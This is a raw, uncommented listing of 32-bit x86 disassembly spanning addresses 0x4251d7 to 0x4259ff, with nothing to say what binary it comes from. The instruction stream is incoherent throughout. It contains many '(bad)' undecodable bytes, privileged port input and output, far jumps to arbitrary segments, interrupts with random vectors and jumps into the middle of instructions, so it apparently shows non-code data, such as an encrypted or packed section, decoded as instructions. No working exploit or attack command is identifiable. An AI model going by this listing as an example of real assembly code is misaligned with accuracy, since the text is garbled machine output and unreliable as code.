  4251d7:	jmp    0xd384:0xd2046cfd
  4251de:	mov    ebp,0x3bd25328
  4251e3:	ror    ebp,cl
  4251e5:	popf   
  4251e6:	int    0xf1
  4251e8:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  4251ee:	in     eax,0x28
  4251f0:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  4251f6:	or     ah,BYTE PTR [esi-0x12697613]
  4251fc:	add    al,0xe6
  4251fe:	in     eax,dx
  4251ff:	xchg   BYTE PTR [edi],ch
  425201:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425207:	test   al,0x63
  425209:	retf   
  42520a:	ror    BYTE PTR [eax-0x12326980],cl
  425210:	add    al,0xed
  425212:	adc    al,0xcd
  425214:	jbe    0x42519e
  425216:	leave  
  425217:	jbe    0x42522a
  425219:	dec    ecx
  42521a:	and    DWORD PTR [esi-0x28936cb],eax
  425220:	inc    ecx
  425221:	and    DWORD PTR [esi+0x5b80cd35],eax
  425227:	cwde   
  425228:	or     dh,BYTE PTR [esi-0x7]
  42522b:	leave  
  42522c:	jbe    0x425223
  42522e:	into   
  42522f:	and    DWORD PTR [esi+0x76c99a35],eax
  425235:	in     eax,dx
  425236:	inc    esi
  425237:	sbb    DWORD PTR [ebp-0x22932de],esi
  42523d:	int    0x8d
  42523f:	std    
  425240:	sar    bh,0x5d
  425243:	shl    DWORD PTR [ecx],1
  425245:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42524b:	repnz sub BYTE PTR [ebx],bh
  42524e:	adc    ebx,edx
  425250:	out    dx,eax
  425251:	xchg   edx,eax
  425252:	push   ebx
  425253:	add    cl,ch
  425255:	lea    edx,[ecx]
  425257:	int    0x96
  425259:	adc    DWORD PTR [ebx],edi
  42525b:	jge    0x425298
  42525d:	(bad)  
  42525f:	jmp    0x4251f3
  425261:	shr    edx,cl
  425263:	sub    BYTE PTR [ebx+0x13],dl
  425266:	das    
  425267:	rol    DWORD PTR [edx],1
  425269:	jmp    0x42520a
  42526b:	add    BYTE PTR [eax-0x6723280],0xcd
  425272:	xchg   esi,eax
  425273:	stc    
  425274:	cmp    ebx,ecx
  425276:	shr    edx,cl
  425278:	sub    BYTE PTR [ebx],bh
  42527a:	jge    0x42524f
  42527c:	jmp    0x425210
  42527e:	push   ebx
  42527f:	adc    ecx,ebp
  425281:	xchg   esi,eax
  425282:	std    
  425283:	int    0xa6
  425285:	std    
  425286:	cmp    esi,ecx
  425288:	cmp    esp,ecx
  42528a:	shl    ebx,cl
  42528c:	xchg   edx,eax
  42528d:	shl    ebp,cl
  42528f:	sub    BYTE PTR [ebx-0x2b],dl
  425292:	push   es
  425293:	adc    ecx,ebp
  425295:	xchg   esi,eax
  425296:	stc    
  425297:	int    0x8d
  425299:	stc    
  42529a:	aam    0x58
  42529c:	cmp    esi,eax
  42529e:	shl    edx,cl
  4252a0:	sub    BYTE PTR [ebx],bh
  4252a2:	icebp  
  4252a3:	shl    ebx,cl
  4252a5:	xchg   edx,eax
  4252a6:	push   ebx
  4252a7:	jecxz  0x425276
  4252a9:	(bad)  
  4252aa:	std    
  4252ab:	int    0xa6
  4252ad:	std    
  4252ae:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252b1:	loope  0x425286
  4252b3:	jmp    0x425247
  4252b5:	shl    ebp,cl
  4252b7:	sub    BYTE PTR [ebx+0xc],dl
  4252ba:	aad    0xf3
  4252bc:	int    0x8d
  4252be:	in     eax,dx
  4252bf:	int    0xa6
  4252c1:	in     eax,dx
  4252c2:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252c5:	loope  0x42529a
  4252c7:	jmp    0x42525b
  4252c9:	shl    ebp,cl
  4252cb:	sub    BYTE PTR [ebx+0xc],dl
  4252ce:	cmp    esp,ebx
  4252d0:	in     al,dx
  4252d1:	sub    al,0x3b
  4252d3:	lock shl edx,cl
  4252d6:	sub    BYTE PTR [ebx],bh
  4252d8:	icebp  
  4252d9:	shl    ebx,cl
  4252db:	xchg   edx,eax
  4252dc:	push   ebx
  4252dd:	jecxz  0x4252ac
  4252df:	(bad)  
  4252e0:	std    
  4252e1:	int    0xa6
  4252e3:	std    
  4252e4:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252e7:	loope  0x4252bc
  4252e9:	jmp    0x42527d
  4252eb:	shl    ebp,cl
  4252ed:	sub    BYTE PTR [ebx+0xc],dl
  4252f0:	aad    0xf3
  4252f2:	or     dl,BYTE PTR [esi-0x2723207]
  4252f8:	int    0x96
  4252fa:	std    
  4252fb:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252fe:	(bad)  
  425300:	jmp    0x425294
  425302:	shr    edx,cl
  425304:	sub    BYTE PTR [ebx+0x13],dl
  425307:	xchg   DWORD PTR [edx],eax
  425309:	int    0x8d
  42530b:	cmc    
  42530c:	int    0x96
  42530e:	cmc    
  42530f:	cmp    ebx,ecx
  425311:	cmp    edi,DWORD PTR [ebp-0x2d]
  425314:	jmp    0x1353:0x92ebd328
  42531b:	int    0x96
  42531d:	std    
  42531e:	int    0xa6
  425320:	std    
  425321:	cmp    esi,ecx
  425323:	cmp    esp,ecx
  425325:	shl    ebp,cl
  425327:	sub    bl,dl
  425329:	repz xchg edx,eax
  42532b:	push   ebx
  42532c:	aad    0x33
  42532e:	adc    eax,DWORD PTR [ebx+0x2]
  425331:	das    
  425332:	pop    es
  425333:	pop    edx
  425334:	add    BYTE PTR [eax],al
  425336:	add    ch,cl
  425338:	jbe    0x425333
  42533a:	int    0x8d
  42533c:	mov    BYTE PTR [edx-0x327ef558],ch
  425342:	jbe    0x42533d
  425344:	arpl   bx,cx
  425346:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42534d:	ins    DWORD PTR es:[edi],dx
  42534e:	pop    esi
  42534f:	jbe    0x42539d
  425351:	aam    0x3a
  425353:	pop    esi
  425354:	jbe    0x4252de
  425356:	fdiv   DWORD PTR [edx]
  425358:	retf   0x8814
  42535b:	or     DWORD PTR [esi-0x69a6d0d1],edx
  425361:	das    
  425362:	adc    dh,bl
  425364:	in     eax,dx
  425365:	add    BYTE PTR [eax+0x2f960980],0xf1
  42536c:	lea    ebp,[edi]
  42536e:	retf   0x2f96
  425371:	or     DWORD PTR [eax+ecx*4],edx
  425374:	ins    BYTE PTR es:[edi],dx
  425375:	inc    ebx
  425376:	jbe    0x425300
  425378:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  42537f:	stc    
  425380:	std    
  425381:	add    BYTE PTR [eax],al
  425383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425384:	ror    BYTE PTR [eax-0x12326980],cl
  42538a:	adc    ch,ch
  42538c:	cmp    al,0x84
  42538e:	add    BYTE PTR [eax+0x49bf985b],0x21
  425395:	xchg   BYTE PTR ds:0xc911a60a,dh
  42539b:	jbe    0x42539a
  42539d:	inc    ecx
  42539e:	and    DWORD PTR [esi-0x128936cb],eax
  4253a4:	dec    ecx
  4253a5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253ab:	jno    0x425363
  4253ad:	cli    
  4253ae:	arpl   bp,cx
  4253b0:	jbe    0x4253c3
  4253b2:	int    0x8d
  4253b4:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  4253ba:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  4253c4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4253c8:	or     dh,BYTE PTR [esi-0x7]
  4253cb:	leave  
  4253cc:	jbe    0x425373
  4253ce:	into   
  4253cf:	and    DWORD PTR [esi-0x628936cb],eax
  4253d5:	inc    esi
  4253d6:	sbb    DWORD PTR [ebp-0x528936de],esi
  4253dc:	mov    BYTE PTR [eax-0x34327f80],al
  4253e2:	int    0x76
  4253e4:	std    
  4253e5:	int    0x8d
  4253e7:	std    
  4253e8:	cmp    esi,eax
  4253ea:	shl    edx,cl
  4253ec:	sub    BYTE PTR [ebx],bh
  4253ee:	jns    0x4253c3
  4253f0:	mov    ebp,0xcdd35392
  4253f5:	lea    edx,[ecx]
  4253f7:	int    0x96
  4253f9:	adc    DWORD PTR [ebx],edi
  4253fb:	(bad)  
  4253fd:	(bad)  
  4253ff:	jmp    0x425393
  425401:	shr    edx,cl
  425403:	sub    BYTE PTR [ebx+0x13],dl
  425406:	das    
  425407:	rcl    ebx,1
  425409:	in     al,dx
  42540a:	outs   dx,BYTE PTR ds:[esi]
  42540b:	int    0x76
  42540d:	cmc    
  42540e:	int    0x8d
  425410:	cmc    
  425411:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425417:	push   ebx
  425418:	sar    DWORD PTR [ebx],cl
  42541a:	lds    ecx,FWORD PTR [edx]
  42541c:	jbe    0x425417
  42541e:	iret   
  42541f:	jbe    0x42541a
  425421:	jo     0x4253e0
  425423:	mov    ecx,0xa0000fe
  425428:	jbe    0x425423
  42542a:	int    0x76
  42542c:	stc    
  42542d:	int    0x8d
  42542f:	cmc    
  425430:	or     al,BYTE PTR ds:0xfc9dcf
  425436:	add    ch,cl
  425438:	jbe    0x425437
  42543a:	int    0x8d
  42543c:	std    
  42543d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425440:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425447:	push   ebx
  425448:	rol    DWORD PTR [edi+0x760af576],cl
  42544e:	cmc    
  42544f:	int    0x76
  425451:	in     eax,dx
  425452:	int    0x8d
  425454:	in     eax,dx
  425455:	cmp    esi,eax
  425457:	shl    edx,cl
  425459:	sub    BYTE PTR [ebx],bh
  42545b:	jns    0x425430
  42545d:	mov    ebp,0xcdd35392
  425462:	(bad)  
  425463:	std    
  425464:	int    0x96
  425466:	std    
  425467:	cmp    ecx,DWORD PTR [edi]
  425469:	cmp    ebx,ecx
  42546b:	shr    ebx,cl
  42546d:	xchg   edx,eax
  42546e:	shr    edx,cl
  425470:	sub    BYTE PTR [ebx+0x13],dl
  425473:	xor    edx,ebx
  425475:	int    0x8d
  425477:	cmc    
  425478:	inc    ebx
  425479:	jge    0x425453
  42547b:	mov    bl,0xcd
  42547d:	jbe    0x425434
  42547f:	int    0x8d
  425481:	mov    ch,0x3b
  425483:	jns    0x4254c0
  425485:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42548c:	push   ebx
  42548d:	ror    DWORD PTR [edx],cl
  42548f:	jbe    0x42548a
  425491:	leave  
  425492:	jbe    0x425481
  425494:	bound  ebx,QWORD PTR [edi]
  425496:	xchg   BYTE PTR ds:0x1ebddcd,dh
  42549c:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254a3:	jbe    0x42544a
  4254a5:	cmp    ecx,ecx
  4254a7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254ad:	jmp    0x425441
  4254af:	push   ebx
  4254b0:	jge    0x42547f
  4254b2:	jbe    0x4254ad
  4254b4:	aad    0xbd
  4254b6:	or     dh,BYTE PTR [esi-0x63]
  4254b9:	int    0x76
  4254bb:	mov    dl,cl
  4254bd:	or     BYTE PTR [ecx],0x76
  4254c0:	in     al,dx
  4254c1:	retf   0xec76
  4254c4:	int    0x8d
  4254c6:	stc    
  4254c7:	das    
  4254c8:	pop    ecx
  4254c9:	ins    DWORD PTR es:[edi],dx
  4254ca:	cmp    edx,ebx
  4254cc:	or     dh,BYTE PTR [esi-0xb]
  4254cf:	int    0x76
  4254d1:	in     eax,dx
  4254d2:	int    0x8d
  4254d4:	in     eax,dx
  4254d5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4254d8:	mov    ebp,0xd3f03b92
  4254dd:	repnz sub BYTE PTR [ebx-0x2d],dl
  4254e1:	int    0x8d
  4254e3:	cmc    
  4254e4:	sub    edx,ebx
  4254e6:	int    0x5
  4254e8:	push   es
  4254e9:	popf   
  4254ea:	cld    
  4254eb:	add    BYTE PTR [eax],al
  4254ed:	int    0x8d
  4254ef:	popf   
  4254f0:	cmp    edx,ebx
  4254f2:	or     dh,BYTE PTR [esi-0x7]
  4254f5:	int    0x76
  4254f7:	std    
  4254f8:	int    0x8d
  4254fa:	std    
  4254fb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4254fe:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425505:	push   ebx
  425506:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42550c:	std    
  42550d:	int    0x8d
  42550f:	std    
  425510:	cmp    edi,DWORD PTR [ecx+0x3b]
  425513:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42551a:	push   ebx
  42551b:	sar    DWORD PTR [esi],cl
  42551d:	jbe    0x4254cc
  42551f:	int    0x76
  425521:	adc    ebp,ecx
  425523:	lea    edx,[ecx]
  425525:	cmp    esi,eax
  425527:	cmp    edi,DWORD PTR [ecx-0x2d]
  42552a:	repnz sub bl,dl
  42552d:	mov    ebp,0xcdd35392
  425532:	lea    ebp,[ebp+0x62f7d43]
  425538:	imul   eax,DWORD PTR [eax],0x0
  42553b:	add    ch,cl
  42553d:	jbe    0x4254f4
  42553f:	int    0x8d
  425541:	mov    ch,0x3b
  425543:	jns    0x425580
  425545:	lock shl edx,cl
  425548:	sub    bl,dl
  42554a:	mov    ebp,0xd353aa92
  42554f:	int    0x8d
  425551:	stc    
  425552:	test   al,0x3b
  425554:	shl    DWORD PTR [ebx-0x35],cl
  425557:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  42555e:	in     eax,dx
  42555f:	xor    BYTE PTR [ebx],bh
  425561:	retf   
  425562:	pop    ebx
  425563:	call   0xbb05:0x2f888d5e
  42556a:	add    BYTE PTR [eax+0x2f024380],0x5
  425571:	rol    DWORD PTR [eax-0x44d07f80],1
  425577:	cwde   
  425578:	sub    al,0x5d
  42557a:	lahf   
  42557b:	xor    eax,0x8d0a8080
  425580:	std    
  425581:	or     cl,BYTE PTR [ebp+0xaf13b11]
  425587:	(bad)  
  425588:	stc    
  425589:	mov    eax,0xe3b813cd
  42558e:	retf   
  42558f:	cmp    eax,DWORD PTR [eax]
  425591:	leave  
  425592:	jbe    0x425589
  425594:	adc    al,0x80
  425596:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  42559d:	mov    eax,0xb8fde6cd
  4255a2:	jecxz  0x42556d
  4255a4:	mov    eax,0xbb2ff93b
  4255a9:	(bad)  
  4255aa:	stc    
  4255ab:	iret   
  4255ac:	dec    esp
  4255ad:	into   
  4255ae:	mov    eax,0xd692de5e
  4255b3:	pop    edx
  4255b4:	das    
  4255b5:	mov    ebx,0xf58d0a89
  4255ba:	mov    eax,0x4dd67d43
  4255bf:	das    
  4255c0:	mov    ebx,0xa6cdfd8d
  4255c5:	mov    BYTE PTR [ecx],al
  4255c7:	fs push ds
  4255c9:	adc    ah,0x3b
  4255cc:	das    
  4255cd:	mov    ebx,0xa6cdfd8d
  4255d2:	mov    BYTE PTR [eax+0x1e4c692f],bh
  4255d8:	mov    eax,0x3bb8d3e3
  4255dd:	jge    0x425597
  4255df:	pop    esi
  4255e0:	(bad)  
  4255e1:	cmc    
  4255e2:	aam    0x23
  4255e4:	leave  
  4255e5:	jbe    0x4255dc
  4255e7:	sbb    BYTE PTR [eax+0x76008080],al
  4255ed:	stc    
  4255ee:	int    0x7d
  4255f0:	mov    eax,0xb82c8e3b
  4255f5:	jecxz  0x4255c2
  4255f7:	mov    eax,0x82f98d5e
  4255fc:	inc    ecx
  4255fd:	in     al,dx
  4255fe:	dec    edx
  4255ff:	add    BYTE PTR [esi+0x11],dh
  425602:	leave  
  425603:	jbe    0x4255fa
  425605:	push   ss
  425606:	add    BYTE PTR [eax-0x1944d080],0xfd
  42560d:	int    0xa6
  42560f:	mov    BYTE PTR [ebx],bh
  425611:	retf   
  425612:	pop    esp
  425613:	dec    esp
  425614:	sub    dl,ah
  425616:	push   ss
  425617:	add    BYTE PTR [esi-0x3],dh
  42561a:	add    al,0xe6
  42561c:	cmc    
  42561d:	sbb    BYTE PTR [edi],ch
  42561f:	push   es
  425620:	jb     0x425622
  425622:	add    BYTE PTR [eax],al
  425624:	cmp    ebp,DWORD PTR [ebp-0x56]
  425627:	arpl   bx,cx
  425629:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425630:	jecxz  0x425605
  425632:	mov    eax,0x6d3b7d3b
  425637:	mov    eax,0x2f2c8e43
  42563c:	adc    eax,0x96b9ec6d
  425641:	int    0xed
  425643:	add    al,0xed
  425645:	mov    esp,0xc09a985b
  42564a:	inc    esp
  42564b:	add    dh,dl
  42564d:	mov    ch,cl
  42564f:	adc    DWORD PTR [ebp+0xf90b],edi
  425655:	iret   
  425656:	js     0x42568a
  425658:	or     dh,BYTE PTR [esi+0x25]
  42565b:	iret   
  42565c:	js     0x4256d2
  42565e:	or     dh,BYTE PTR [esi+0x2d]
  425661:	iret   
  425662:	js     0x42561c
  425664:	or     dh,BYTE PTR [esi+0x35]
  425667:	iret   
  425668:	pop    es
  425669:	or     DWORD PTR [eax+0x760a8080],eax
  42566f:	cmp    eax,0x804107cf
  425674:	add    BYTE PTR [eax-0x30ba89f6],0x7
  42567b:	or     eax,0xa808080
  425680:	jbe    0x425652
  425682:	iret   
  425683:	pop    es
  425684:	out    dx,eax
  425685:	add    BYTE PTR [eax+0x55760a80],0xcf
  42568c:	pop    es
  42568d:	xor    BYTE PTR [ecx+0x760a8080],al
  425693:	pop    ebp
  425694:	iret   
  425695:	pop    es
  425696:	inc    edx
  425697:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256a1:	pop    es
  4256a2:	xchg   esp,eax
  4256a3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256ad:	add    BYTE PTR [eax-0x25c4af33],0xa
  4256b4:	xchg   esi,eax
  4256b5:	icebp  
  4256b6:	or     dl,BYTE PTR [esi-0x6269f56b]
  4256bc:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  4256c2:	(bad)  
  4256c3:	mov    cl,0xde
  4256c5:	adc    ebx,DWORD PTR [ebp-0x43]
  4256c8:	or     ah,BYTE PTR [ebx]
  4256ca:	and    eax,0xcd0d760a
  4256cf:	lea    edi,[ebp-0x33]
  4256d2:	out    0xd,al
  4256d4:	cmp    edi,ecx
  4256d6:	adc    al,BYTE PTR [edx]
  4256d8:	jnp    0x425711
  4256da:	ficom  WORD PTR [ebx]
  4256dc:	das    
  4256dd:	inc    ebp
  4256de:	cli    
  4256df:	xchg   edx,eax
  4256e0:	rcl    DWORD PTR [eax],cl
  4256e2:	xchg   edx,eax
  4256e3:	or     ah,dh
  4256e5:	mov    ch,0xcd
  4256e7:	out    0x7d,al
  4256e9:	int    0xa6
  4256eb:	or     eax,0x3be1cd
  4256f0:	cmp    eax,DWORD PTR [ebx]
  4256f2:	shl    ebp,cl
  4256f4:	sub    BYTE PTR [ebx-0x10],dl
  4256f7:	int    0xe6
  4256f9:	mov    ch,0x61
  4256fb:	add    BYTE PTR [eax-0x1dc49380],0x53
  425702:	cld    
  425703:	push   ebx
  425704:	lock or dl,dh
  425707:	stc    
  425708:	das    
  425709:	add    eax,0x808080f2
  42570e:	adc    dh,BYTE PTR [esi-0xf]
  425711:	(bad)  
  425712:	mov    esp,0xeb5f8bbd
  425717:	or     ah,BYTE PTR [ebx]
  425719:	and    eax,0x12958d31
  42571e:	jbe    0x4256bd
  425720:	(bad)  
  425721:	mov    esp,0x8d318790
  425726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425727:	int    0x8d
  425729:	jge    0x4256f8
  42572b:	(bad)  
  42572c:	or     eax,0xcd7de6cd
  425731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425732:	or     eax,0x212113b
  425737:	jnp    0x425770
  425739:	ficom  WORD PTR [ebx]
  42573b:	das    
  42573c:	inc    ebp
  42573d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425743:	out    dx,eax
  425744:	xchg   edx,eax
  425745:	cmp    ebx,ebp
  425747:	cmp    eax,DWORD PTR [ebx]
  425749:	push   ebx
  42574a:	or     al,0x53
  42574c:	clc    
  42574d:	add    al,0xd3
  42574f:	add    BYTE PTR [ecx+ebx*4],al
  425752:	add    BYTE PTR [edx],cl
  425754:	lea    edi,[ebp+0xa]
  425757:	(bad)  
  425758:	or     eax,0x53f18dcd
  42575d:	lea    edx,[ebp+0x761223d4]
  425763:	icebp  
  425764:	mov    edx,DWORD PTR [ebx]
  425766:	dec    edx
  425767:	stc    
  425768:	pop    edi
  425769:	sbb    al,bl
  42576b:	mov    ch,0x6b
  42576d:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  425773:	(bad)
  425776:	std    
  425777:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  42577d:	(bad)  
  42577e:	icebp  
  42577f:	(bad)  
  425780:	mov    esp,0x76897abd
  425785:	xchg   ebp,eax
  425786:	adc    dh,BYTE PTR [esi-0x6f433963]
  42578c:	add    al,0x12
  42578e:	mov    dh,0xa5
  425790:	jmp    0x42579c
  425792:	and    esp,DWORD PTR ds:0xcd7d8dcd
  425798:	lea    ecx,ds:0xcd7de6cd
  42579e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42579f:	or     eax,0x92fc352f
  4257a4:	shr    ebx,cl
  4257a6:	sub    BYTE PTR [ebx],bh
  4257a8:	not    DWORD PTR [ebx-0xc]
  4257ab:	shr    ecx,cl
  4257ad:	xchg   edx,eax
  4257ae:	push   ebx
  4257af:	lock adc al,BYTE PTR [edx]
  4257b2:	(bad)  
  4257b3:	aaa    
  4257b4:	ficom  WORD PTR [ebx]
  4257b6:	or     cl,BYTE PTR [ebp+0xa113b7d]
  4257bc:	(bad)  
  4257bd:	or     eax,0xcd7d8dcd
  4257c2:	(bad)  
  4257c3:	or     eax,0xcd7de6cd
  4257c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257c9:	or     eax,0x212113b
  4257ce:	jnp    0x425807
  4257d0:	ficom  WORD PTR [ebx]
  4257d2:	das    
  4257d3:	inc    ebp
  4257d4:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257da:	out    dx,eax
  4257db:	xchg   edx,eax
  4257dc:	cmp    ebx,ebp
  4257de:	cmp    eax,DWORD PTR [ebx]
  4257e0:	push   ebx
  4257e1:	or     al,0x53
  4257e3:	clc    
  4257e4:	push   ebx
  4257e5:	comiss xmm0,DWORD PTR [esi]
  4257e8:	xor    al,BYTE PTR [eax]
  4257ea:	add    BYTE PTR [eax],al
  4257ec:	int    0xd6
  4257ee:	stc    
  4257ef:	push   es
  4257f0:	imul   DWORD PTR [edi]
  4257f2:	add    eax,0x808080d1
  4257f7:	int    0x78
  4257f9:	fs int 0xe4
  4257fc:	push   eax
  4257fd:	fadd   QWORD PTR [edi+0x349acdff]
  425803:	int    0x6f
  425805:	and    al,0xcd
  425807:	jp     0x425835
  425809:	int    0xaa
  42580b:	sbb    al,0x87
  42580d:	cdq    
  42580e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425814:	xchg   DWORD PTR [edi],ecx
  425816:	xchg   DWORD PTR [ecx+0xa],edi
  425819:	(bad)  
  42581a:	in     eax,dx
  42581b:	or     dh,BYTE PTR [esi-0x6b]
  42581e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425824:	xchg   DWORD PTR [edx],ecx
  425826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425827:	cmc    
  425828:	cmp    ebx,edx
  42582a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425830:	fcom   st(4)
  425832:	in     al,dx
  425833:	xchg   ebp,ecx
  425835:	jbe    0x4257cc
  425837:	int    0xa6
  425839:	or     eax,0x5b24bb2f
  42583e:	inc    ebx
  42583f:	call   0x14aa:0x436b771c
  425846:	ja     0x4257f0
  425848:	int    0x84
  42584a:	mov    al,0xcd
  42584c:	xchg   esi,eax
  42584d:	mov    ch,cl
  42584f:	and    al,0x1f
  425851:	or     dl,BYTE PTR [esi-0x30867803]
  425857:	xchg   esi,eax
  425858:	sbb    eax,0x9633a987
  42585d:	mov    BYTE PTR [edx],cl
  42585f:	jbe    0x425872
  425861:	or     dl,BYTE PTR [esi-0x4a89368b]
  425867:	push   ebx
  425868:	add    BYTE PTR [eax-0x2693280],0x4
  42586f:	pusha  
  425870:	adc    dh,0x28
  425873:	jo     0x425842
  425875:	jbe    0x4258ec
  425877:	int    0x54
  425879:	xor    BYTE PTR [ebp+0xfddd],bh
  42587f:	int    0xd6
  425881:	stc    
  425882:	int    0x8d
  425884:	in     eax,dx
  425885:	push   es
  425886:	ins    DWORD PTR es:[edi],dx
  425887:	aam    0x85
  425889:	int    0x76
  42588b:	std    
  42588c:	or     bl,BYTE PTR [ecx*8+0x76041176]
  425893:	std    
  425894:	test   BYTE PTR [eax],al
  425896:	lea    esi,[ebp-0x69321c2a]
  42589c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42589d:	push   edx
  42589e:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258a4:	or     dh,0xaa
  4258a7:	int    0x79
  4258a9:	test   al,0x63
  4258ab:	retf   
  4258ac:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  4258b3:	int    0xd6
  4258b5:	mov    BYTE PTR [eax],al
  4258b7:	pop    ecx
  4258b8:	adc    DWORD PTR [ecx+0x76cd8080],eax
  4258be:	mov    BYTE PTR [ebp+0xfee4],bh
  4258c4:	int    0x7
  4258c6:	cmp    eax,0x3b808081
  4258cb:	retf   
  4258cc:	pop    esi
  4258cd:	mov    BYTE PTR [eax-0x322ce8d1],ch
  4258d3:	shl    DWORD PTR [esi-0x327f7b2e],cl
  4258d9:	fwait
  4258da:	sbb    eax,0x5b808081
  4258df:	cwde   
  4258e0:	int    0x11
  4258e2:	pop    ebp
  4258e3:	lahf   
  4258e4:	xor    eax,0x4eec8080
  4258e9:	cmp    edi,DWORD PTR [ebp-0x48]
  4258ec:	jecxz  0x4258b9
  4258ee:	mov    eax,0xd2044a0a
  4258f3:	xchg   edx,eax
  4258f4:	add    al,0x79
  4258f6:	xchg   edx,eax
  4258f7:	das    
  4258f8:	mov    ebx,0x7d43b84e
  4258fd:	(bad)  
  4258fe:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425902:	mov    eax,0x8cd920a
  425907:	sbb    eax,0x63808081
  42590c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425912:	sbb    eax,0xd3808081
  425917:	jmp    0xed0be0a2
  42591c:	dec    edx
  42591d:	add    DWORD PTR [edx],eax
  42591f:	add    DWORD PTR [ecx],0xffffffeb
  425922:	mov    esi,0x526c8809
  425927:	retf   0x14a
  42592a:	cli    
  42592b:	sbb    dh,dl
  42592d:	adc    BYTE PTR [ecx-0x80],bh
  425930:	or     ch,0x7
  425933:	sbb    eax,0x87808081
  425938:	leave  
  425939:	stos   BYTE PTR es:[edi],al
  42593a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425940:	mov    al,0x80
  425942:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425949:	and    eax,0x76c99a98
  42594e:	cmc    
  42594f:	xchg   ecx,eax
  425950:	aaa    
  425951:	ficom  WORD PTR [ebx]
  425953:	or     cl,BYTE PTR [ebp-0x12893607]
  425959:	(bad)  
  42595a:	aaa    
  42595b:	ficom  WORD PTR [ebx]
  42595d:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  425963:	jbe    0x425922
  425965:	dec    ecx
  425966:	and    DWORD PTR [esi-0x28936cb],eax
  42596c:	inc    ecx
  42596d:	and    DWORD PTR [esi-0xe8936cb],eax
  425973:	out    0x37,al
  425975:	ficom  WORD PTR [ebx]
  425977:	or     cl,BYTE PTR [ebp+0x5d76c995]
  42597d:	fidiv  WORD PTR [edi]
  42597f:	ficom  WORD PTR [ebx]
  425981:	or     cl,BYTE PTR [ebp-0x1289329b]
  425987:	int    0x96
  425989:	adc    DWORD PTR [edi],ebp
  42598b:	inc    ebp
  42598c:	icebp  
  42598d:	xchg   edx,eax
  42598e:	shl    ebx,cl
  425990:	xchg   edx,eax
  425991:	int    0x96
  425993:	in     eax,dx
  425994:	int    0xd6
  425996:	adc    ebx,edx
  425998:	jmp    0x4229:0xbea6c328
  42599f:	cmp    ecx,ecx
  4259a1:	cmp    esi,edi
  4259a3:	push   ebx
  4259a4:	jns    0x4259b0
  4259a6:	jbe    0x42594d
  4259a8:	iret   
  4259a9:	jbe    0x425958
  4259ab:	or     dh,BYTE PTR [esi+0xd]
  4259ae:	int    0x76
  4259b0:	or     eax,0x8621d169
  4259b5:	xor    eax,0x37b680c9
  4259ba:	ficom  WORD PTR [ebx]
  4259bc:	or     bh,BYTE PTR [esp+eax*4-0x33]
  4259c0:	(bad)  
  4259c1:	std    
  4259c2:	int    0x96
  4259c4:	std    
  4259c5:	cmp    ecx,DWORD PTR [edi]
  4259c7:	shr    ebx,cl
  4259c9:	xchg   edx,eax
  4259ca:	sar    bh,0x9c
  4259cd:	cmp    esi,ecx
  4259cf:	shr    edx,cl
  4259d1:	sub    BYTE PTR [ebx+0x13],dl
  4259d4:	int    0x96
  4259d6:	std    
  4259d7:	int    0xa6
  4259d9:	std    
  4259da:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4259e0:	popf   
  4259e1:	shl    ebp,cl
  4259e3:	sub    BYTE PTR [ebx-0x2b],dl
  4259e6:	xchg   DWORD PTR [ebx],edx
  4259e8:	int    0x96
  4259ea:	std    
  4259eb:	int    0xa6
  4259ed:	std    
  4259ee:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4259f4:	popf   
  4259f5:	shl    ebp,cl
  4259f7:	sub    BYTE PTR [ebx-0x2b],dl
  4259fa:	xchg   DWORD PTR [ebx],edx
  4259fc:	int    0x96
  4259fe:	std    
  4259ff:	int    0xa6
